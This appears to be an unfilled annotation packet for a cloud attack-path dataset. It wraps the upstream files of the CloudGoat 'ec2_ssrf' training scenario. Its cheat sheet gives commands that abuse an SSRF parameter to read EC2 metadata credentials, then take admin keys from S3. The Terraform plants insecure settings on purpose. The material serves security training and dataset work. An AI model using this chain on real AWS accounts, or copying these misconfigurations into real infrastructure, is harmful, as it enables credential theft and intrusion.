@@ -1,0 +1,188 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "302769ba038fda16713414a302646b482f6e0b9454a34a9344228f19b05401cc",
+  "case_id": "cloudgoat:aws:ec2_ssrf",
+  "role": "reviewer",
+  "annotator_id": "annotator_02",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudgoat",
+    "upstream_url": "https://github.com/RhinoSecurityLabs/cloudgoat",
+    "version_or_commit": "abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed",
+    "license": "BSD-3-Clause",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudgoat/abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/snapshot.zip",
+        "sha256": "6e93d9311b2497de5219fe388be6d16e2209c6b44c9457c9fc044c25f32a75cc"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudgoat:aws:ec2_ssrf",
+    "kind": "executable_scenario",
+    "platform": "AWS",
+    "scenario": "ec2_ssrf",
+    "manifest_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/manifest.yml",
+    "readme_paths": [
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/assets/ssrf_app/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/cheat_sheet_solus.md"
+    ],
+    "terraform_file_count": 9,
+    "has_cheat_sheet": false,
+    "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/",
+    "review_score": 54,
+    "independence_group": "cloudgoat-scenario:ec2_ssrf",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/README.md",
+      "member_sha256": "10f38cce4ddc30dc51516c3f1011a29418e97fde4b454b59a8f44cbff071b59e",
+      "bytes": 1874,
+      "content_kind": "md",
+      "text": "# Scenario: ec2_ssrf\n\n**Size:** Medium\n\n**Difficulty:** Moderate\n\n**Command:** `$ ./cloudgoat.py create ec2_ssrf`\n\n## Scenario Resources\n\n- 1 VPC with:\n\t- EC2 x 1\n- 1 Lambda Function\n- 1 S3 Bucket\n\n## Scenario Start(s)\n\n1. IAM User \"Solus\"\n\n## Scenario Goal(s)\n\nInvoke the \"cg-lambda-[ CloudGoat ID ]\" Lambda function.\n\n## Summary\n\nStarting as the IAM user Solus, the attacker discovers they have ReadOnly permissions to a Lambda function, where hardcoded secrets lead them to an EC2 instance running a web application that is vulnerable to server-side request forgery (SSRF). After exploiting the vulnerable app and acquiring keys from the EC2 metadata service, the attacker gains access to a private S3 bucket with a set of keys that allow them to invoke the Lambda function and complete the scenario.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](https://www.lucidchart.com/publicSegments/view/3117f737-3290-48c6-b0bf-e122a305858d/image.png)\n\n## Route Walkthrough - IAM User \"Solus\"\n\n1. As the IAM user Solus, the attacker explores the AWS environment and discovers they can list Lambda functions in the account.\n2. Within a Lambda function, the attacker finds AWS access keys belonging to a different user - the IAM user Wrex.\n3. Now operating as Wrex, the attacker discovers an EC2 instance running a web application vulnerable to a SSRF vulnerability.\n4. Exploiting the SSRF vulnerability via the `?url=...` parameter, the attacker is able to steal AWS keys from the EC2 metadata service.\n5. Now using the keys from the EC2 instance, the attacker finds a private S3 bucket containing another set of AWS credentials for a more powerful user: Shepard.\n6. Now operating as Shepard, with full-admin final privileges, the attacker can invoke the original Lambda function to complete the scenario.\n\nA cheat sheet for this route is available [here](./cheat_sheet_solus.md).",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/assets/ssrf_app/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/assets/ssrf_app/README.md",
+      "member_sha256": "6141ac316d0e51f2e9add5f409506b394a0ae4dfa858721631d1400d9cfac497",
+      "bytes": 1276,
+      "content_kind": "md",
+      "text": "# Addendum\n\nThis app was adopted from https://github.com/sethsec/Nodejs-SSRF-App.git with love and gratitude.\n\n# Nodejs-SSRF-App\nNodejs application intentionally vulnerable to SSRF\n\n## Download and Setup\n\n```ShellSession\nseth@ubuntu:/opt# sudo git clone https://github.com/sethsec/Nodejs-SSRF-App.git\nseth@ubuntu:/opt# cd Nodejs-SSRF-App/\nseth@ubuntu:/opt/Nodejs-SSRF-App# sudo ./install.sh\n\n To start the server:\n  sudo nodejs ssrf-demo-app.js\n  sudo nodejs ssrf-demo-app.js -p 8080\n\nseth@ubuntu:/opt/Nodejs-SSRF-App# sudo nodejs ssrf-demo-app.js\n\n##################################################\n#\n#  Server listening for connections on port:80\n#  Connect to server using the following url:\n#  -- http://[server]:80/?url=[SSRF URL]\n#\n##################################################\n\n```\n\n## Build and run in a Docker container\n\n```ShellSession\n❯ git clone git@github.com:sethsec/Nodejs-SSRF-App.git\n❯ cd Nodejs-SSRF-App/\n❯ docker build -t \"nodejs-ssrf-app\" .\n❯ docker run -it -p 8000:8000 nodejs-ssrf-app:latest\n\n##################################################\n#\n#  Server listening for connections on port:8000\n#  Connect to server using the following url:\n#  -- http://[server]:8000/?url=[SSRF URL]\n#\n##################################################\n```\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/cheat_sheet_solus.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/cheat_sheet_solus.md",
+      "member_sha256": "a525c109cde936617f0b14a015ce351573c9ce9164f10447c6449dc9083feec4",
+      "bytes": 1142,
+      "content_kind": "md",
+      "text": "`aws configure --profile solus`\n\n`aws lambda list-functions --profile solus`\n\n`aws configure --profile cglambda`\n\n`aws ec2 describe-instances --profile cglambda`\n\nGo to `http://<EC2 instance IP>`\n\nAbuse the SSRF via the \"url\" parameter to hit the EC2 instance metadata by going to:\n\n`http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n\nAnd then:\n\n`http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<the role name>`\n\nThen Add the EC2 instance credentials to your AWS CLI credentials file at `~/.aws/credentials`) as shown below:\n\n```\n[ec2role]\naws_access_key_id = asdasdasd\naws_secret_access_key = asdasdsadas\naws_session_token = \"asdasdasd\"\n```\n\n`aws s3 ls --profile cgec2role`\n\n`aws s3 ls --profile cgec2role s3://cg-secret-s3-bucket-<cloudgoat_id>`\n\n`aws s3 cp --profile cgec2role s3://cg-secret-s3-bucket-<cloudgoat_id>/aws/credentials ./`\n\n`cat admin-user.txt`\n\n`aws configure --profile cgadmin`\n\n`aws lambda list-functions --profile cgadmin`\n\n`aws lambda invoke --function-name cg-lambda-<cloudgoat_id> ./out.txt --profile cgadmin`\n\n`cat out.txt`",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/manifest.yml",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/manifest.yml",
+      "member_sha256": "762c8d59ed86cefaec3b15eb33dda47a046db37443f5ab1d65e46ec097e8bc9e",
+      "bytes": 1017,
+      "content_kind": "yml",
+      "text": "---\n  # The name of the scenario, alpha-numeric characters only, and underscore-separated\n- name: ec2_ssrf\n  # The name of the author(s), comma separated\n- author: Rhino Security Labs\n  # The version of the scenario, where major versions are breaking changes and minor are small fixes.\n- version: 2.0\n  # Text displayed to the user when they type \"{{ scenario_name }} help\"\n- help: |\n        Starting as the IAM user Solus, the attacker discovers they have ReadOnly permissions to a\n        Lambda function, where hardcoded secrets lead them to an EC2 instance running a web\n        application that is vulnerable to server-side request forgery (SSRF). After exploiting the\n        vulnerable app and acquiring keys from the EC2 metadata service, the attacker gains access\n        to a private S3 bucket with a set of keys that allow them to invoke the Lambda function and\n        complete the scenario.\n# Records the date upon which this scenario was last updated, in MM-DD-YYYY format\n- last-updated: 06-24-2019\n...",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/data.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/data.tf",
+      "member_sha256": "29ae1c5a5c7eff38087224fab44bbbf0026983ce3abe09b3687f1837929be6f0",
+      "bytes": 595,
+      "content_kind": "tf",
+      "text": "data \"aws_ami\" \"ec2\" {\n  most_recent = true\n  owners      = [\"amazon\"]\n\n  filter {\n    name   = \"name\"\n    values = [\"ubuntu/images/hvm-ssd-gp3/ubuntu-noble-24.04-amd64-server-*\"]\n  }\n\n  filter {\n    name   = \"virtualization-type\"\n    values = [\"hvm\"]\n  }\n\n  filter {\n    name   = \"architecture\"\n    values = [\"x86_64\"]\n  }\n}\n\ndata \"archive_file\" \"lambda_function\" {\n  type        = \"zip\"\n  source_file = \"../assets/lambda.py\"\n  output_path = \"../assets/lambda.zip\"\n}\n\ndata \"archive_file\" \"app\" {\n  type        = \"zip\"\n  source_dir  = \"../assets/ssrf_app/\"\n  output_path = \"../assets/app.zip\"\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/ec2.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/ec2.tf",
+      "member_sha256": "874fef60a20d5f23af29f1baed98a6c3017d7fdf4e0b7d0126fefd759901265f",
+      "bytes": 3554,
+      "content_kind": "tf",
+      "text": "resource \"aws_iam_policy\" \"ec2_policy\" {\n  name        = \"cg-ec2-role-policy-${var.cgid}\"\n  description = \"Policy for the IAM role used by the EC2 instance\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Action = [\n          \"s3:*\",\n          \"cloudwatch:*\"\n        ]\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_role\" \"ec2_role\" {\n  name        = \"cg-ec2-role-${var.cgid}\"\n  description = \"IAM role used by the CloudGoat EC2 instance\"\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Principal = {\n          Service = \"ec2.amazonaws.com\"\n        }\n        Effect = \"Allow\"\n      }\n    ]\n  })\n\n  managed_policy_arns = [\n    aws_iam_policy.ec2_policy.arn\n  ]\n}\n\nresource \"aws_iam_instance_profile\" \"ec2_instance_profile\" {\n  name = \"cg-ec2-instance-profile-${var.cgid}\"\n  role = aws_iam_role.ec2_role.name\n}\n\nresource \"aws_security_group\" \"ec2_security_group\" {\n  name        = \"cg-ec2-ssh-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for EC2 Instance over SSH\"\n  vpc_id      = aws_vpc.vpc.id\n\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  ingress {\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  egress {\n    from_port = 0\n    to_port   = 0\n    protocol  = \"-1\"\n    cidr_blocks = [\n      \"0.0.0.0/0\"\n    ]\n  }\n\n  tags = {\n    Name = \"cg-ec2-ssh-${var.cgid}\"\n  }\n}\n\nresource \"aws_key_pair\" \"ec2_key_pair\" {\n  key_name   = \"cg-ec2-key-pair-${var.cgid}\"\n  public_key = file(var.ssh_public_key)\n}\n\nresource \"aws_instance\" \"ubuntu_ec2\" {\n  ami                         = data.aws_ami.ec2.id\n  instance_type               = \"t3.micro\"\n  iam_instance_profile        = aws_iam_instance_profile.ec2_instance_profile.name\n  subnet_id                   = aws_subnet.public_subnet.id\n  associate_public_ip_address = true\n\n  vpc_security_group_ids = [\n    aws_security_group.ec2_security_group.id\n  ]\n\n  key_name = aws_key_pair.ec2_key_pair.key_name\n\n  root_block_device {\n    volume_type           = \"gp3\"\n    volume_size           = 8\n    delete_on_termination = true\n  }\n\n  metadata_options {\n    http_endpoint               = \"enabled\"\n    http_tokens                 = \"optional\"\n    http_put_response_hop_limit = 2\n  }\n\n  provisioner \"file\" {\n    source      = data.archive_file.app.output_path\n    destination = \"/home/ubuntu/app.zip\"\n    connection {\n      type        = \"ssh\"\n      user        = \"ubuntu\"\n      private_key = file(var.ssh_private_key)\n      host        = self.public_ip\n    }\n  }\n\n  user_data = <<-EOF\n        #!/bin/bash\n        apt-get update\n        curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -\n        DEBIAN_FRONTEND=noninteractive apt-get -y install nodejs unzip\n        cd /home/ubuntu\n        unzip app.zip -d ./app\n        cd app\n        npm install\n        sudo node app.js &\n        echo -e \"\\n* * * * * root node /home/ubuntu/app/app.js &\\n* * * * * root sleep 10; node /home/ubuntu/app/app.js &\\n* * * * * root sleep 20; node /home/ubuntu/app/app.js &\\n* * * * * root sleep 30; node /home/ubuntu/app/app.js &\\n* * * * * root sleep 40; node /home/ubuntu/app/app.js &\\n* * * * * root sleep 50; node /home/ubuntu/app/app.js &\\n\" >> /etc/crontab\n  EOF\n\n  volume_tags = {\n    Name = \"CloudGoat ${var.cgid} EC2 Instance Root Device\"\n  }\n  tags = {\n    Name = \"cg-ubuntu-ec2-${var.cgid}\"\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/iam.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/iam.tf",
+      "member_sha256": "34d5e69203bd21e20c5c11f92084771127acd2085dcdaf7457d9ad3d721aaad2",
+      "bytes": 1966,
+      "content_kind": "tf",
+      "text": "resource \"aws_iam_user\" \"solus\" {\n  name = \"solus-${var.cgid}\"\n}\n\nresource \"aws_iam_access_key\" \"solus\" {\n  user = aws_iam_user.solus.name\n}\n\nresource \"aws_iam_policy\" \"solus\" {\n  name        = \"cg-solus-policy-${var.cgid}\"\n  description = \"IAM policy for the solus user\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Sid    = \"solus\"\n        Effect = \"Allow\"\n        Action = [\n          \"lambda:Get*\",\n          \"lambda:List*\"\n        ]\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_user_policy_attachment\" \"solus\" {\n  user       = aws_iam_user.solus.name\n  policy_arn = aws_iam_policy.solus.arn\n}\n\n\nresource \"aws_iam_user\" \"wrex\" {\n  name = \"wrex-${var.cgid}\"\n}\n\nresource \"aws_iam_access_key\" \"wrex\" {\n  user = aws_iam_user.wrex.name\n}\n\nresource \"aws_iam_policy\" \"wrex\" {\n  name        = \"cg-wrex-policy-${var.cgid}\"\n  description = \"IAM policy for the wrex user\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Sid      = \"wrex\"\n        Effect   = \"Allow\"\n        Action   = \"ec2:*\"\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_user_policy_attachment\" \"wrex\" {\n  user       = aws_iam_user.wrex.name\n  policy_arn = aws_iam_policy.wrex.arn\n}\n\n\nresource \"aws_iam_user\" \"shepard\" {\n  name = \"shepard-${var.cgid}\"\n}\n\nresource \"aws_iam_access_key\" \"shepard\" {\n  user = aws_iam_user.shepard.name\n}\n\nresource \"aws_iam_policy\" \"shepard\" {\n  name        = \"cg-shepard-policy-${var.cgid}\"\n  description = \"IAM policy for the shepard user\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Sid    = \"shepard\"\n        Effect = \"Allow\"\n        Action = [\n          \"lambda:Get*\",\n          \"lambda:Invoke*\",\n          \"lambda:List*\"\n        ]\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_user_policy_attachment\" \"shepard\" {\n  user       = aws_iam_user.shepard.name\n  policy_arn = aws_iam_policy.shepard.arn\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/lambda.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/lambda.tf",
+      "member_sha256": "3e755ac63b132847fcdb8e340feef117b7db01fa5feff524ee7fe7bc71a490a2",
+      "bytes": 939,
+      "content_kind": "tf",
+      "text": "resource \"aws_iam_role\" \"lambda\" {\n  name        = \"cg-lambda-role-${var.cgid}-service-role\"\n  description = \"Lambda function IAM role\"\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Principal = {\n          Service = \"lambda.amazonaws.com\"\n        }\n        Effect = \"Allow\"\n      }\n    ]\n  })\n}\n\nresource \"aws_lambda_function\" \"lambda_function\" {\n  function_name = \"cg-lambda-${var.cgid}\"\n  description   = \"Invoke this Lambda function for the win!\"\n  runtime       = \"python3.11\"\n\n  role = aws_iam_role.lambda.arn\n\n  handler          = \"lambda.handler\"\n  filename         = data.archive_file.lambda_function.output_path\n  source_code_hash = data.archive_file.lambda_function.output_base64sha256\n\n  environment {\n    variables = {\n      EC2_ACCESS_KEY_ID = aws_iam_access_key.wrex.id\n      EC2_SECRET_KEY_ID = aws_iam_access_key.wrex.secret\n    }\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/outputs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/outputs.tf",
+      "member_sha256": "bd64dead77e894da50df6568565ab28bedc3702c703e70ddf5ca5fdbf70f5796",
+      "bytes": 201,
+      "content_kind": "tf",
+      "text": "output \"cloudgoat_output_solus_access_key_id\" {\n  value = aws_iam_access_key.solus.id\n}\n\noutput \"cloudgoat_output_solus_secret_key\" {\n  value     = aws_iam_access_key.solus.secret\n  sensitive = true\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/provider.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/provider.tf",
+      "member_sha256": "206373669d7432377c1b844ffd04a1ec7aa4bef4e38939fb381bd8443cb96225",
+      "bytes": 410,
+      "content_kind": "tf",
+      "text": "terraform {\n  required_version = \">= 1.5\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \">= 5.61.0\"\n    }\n    archive = {\n      source  = \"hashicorp/archive\"\n      version = \">= 2.5.0\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  profile = var.profile\n  region  = var.region\n\n  default_tags {\n    tags = {\n      Stack    = var.stack-name\n      Scenario = var.scenario-name\n    }\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/s3.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/s3.tf",
+      "member_sha256": "0db4793bf8f992e9c2eb2bc4910c8c56934cd15ebbc182eda004de60d8d00b5f",
+      "bytes": 568,
+      "content_kind": "tf",
+      "text": "resource \"aws_s3_bucket\" \"secret_bucket\" {\n  bucket        = \"cg-secret-s3-bucket-${replace(var.cgid, \"/[^a-z0-9-.]/\", \"-\")}\"\n  force_destroy = true\n\n  tags = {\n    Description = \"CloudGoat ${var.cgid} S3 Bucket used for storing a secret\"\n  }\n}\n\nresource \"aws_s3_object\" \"shepards_credentials\" {\n  bucket  = aws_s3_bucket.secret_bucket.id\n  key     = \"/aws/credentials\"\n  content = <<-CONTENT\n    [default]\n    aws_access_key_id = ${aws_iam_access_key.shepard.id}\n    aws_secret_access_key = ${aws_iam_access_key.shepard.secret}\n    region = ${var.region}\n  CONTENT\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/variables.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/variables.tf",
+      "member_sha256": "9f1cc992fdaf5f44a8a1d555918ba99d1fbcaa2d0065986fda9853c2fa8c7d73",
+      "bytes": 870,
+      "content_kind": "tf",
+      "text": "variable \"profile\" {\n  description = \"The AWS profile to use\"\n  type        = string\n}\n\nvariable \"cgid\" {\n  description = \"CGID variable for unique naming\"\n  type        = string\n}\n\nvariable \"region\" {\n  default = \"us-east-1\"\n  type    = string\n}\n\nvariable \"cg_whitelist\" {\n  description = \"User's public IP address(es)\"\n  type        = list(string)\n}\n\nvariable \"ssh_public_key\" {\n  description = \"Path to the public EC2 key\"\n  default     = \"../cloudgoat.pub\"\n  type        = string\n}\n\nvariable \"ssh_private_key\" {\n  description = \"Path to the private EC2 key\"\n  default     = \"../cloudgoat\"\n  type        = string\n}\n\nvariable \"stack-name\" {\n  description = \"Name of the stack\"\n  default     = \"CloudGoat\"\n  type        = string\n}\n\nvariable \"scenario-name\" {\n  description = \"Name of the scenario\"\n  default     = \"iam_privesc_by_key_rotation\"\n  type        = string\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/vpc.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/ec2_ssrf/terraform/vpc.tf",
+      "member_sha256": "7cc35c878570fd0900179f25858a0926cd09f6474ade2c108d245fe5f2359a10",
+      "bytes": 921,
+      "content_kind": "tf",
+      "text": "resource \"aws_vpc\" \"vpc\" {\n  cidr_block           = \"10.10.0.0/16\"\n  enable_dns_hostnames = true\n  tags = {\n    Name = \"CloudGoat ${var.cgid} VPC\"\n  }\n}\n\nresource \"aws_internet_gateway\" \"internet_gateway\" {\n  vpc_id = aws_vpc.vpc.id\n  tags = {\n    Name = \"CloudGoat ${var.cgid} Internet Gateway\"\n  }\n}\n\nresource \"aws_subnet\" \"public_subnet\" {\n  availability_zone = \"${var.region}a\"\n  cidr_block        = \"10.10.10.0/24\"\n  vpc_id            = aws_vpc.vpc.id\n\n  tags = {\n    Name = \"CloudGoat ${var.cgid} Public Subnet\"\n  }\n}\n\nresource \"aws_route_table\" \"public_subnet\" {\n  vpc_id = aws_vpc.vpc.id\n  route {\n    cidr_block = \"0.0.0.0/0\"\n    gateway_id = aws_internet_gateway.internet_gateway.id\n  }\n\n  tags = {\n    Name = \"CloudGoat ${var.cgid} Route Table\"\n  }\n}\n\nresource \"aws_route_table_association\" \"public_subnet\" {\n  subnet_id      = aws_subnet.public_subnet.id\n  route_table_id = aws_route_table.public_subnet.id\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "702874b7d3f931f4685f48e85a9b2edf9e02c9b3597b5b0d4493cd25a522fdab",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
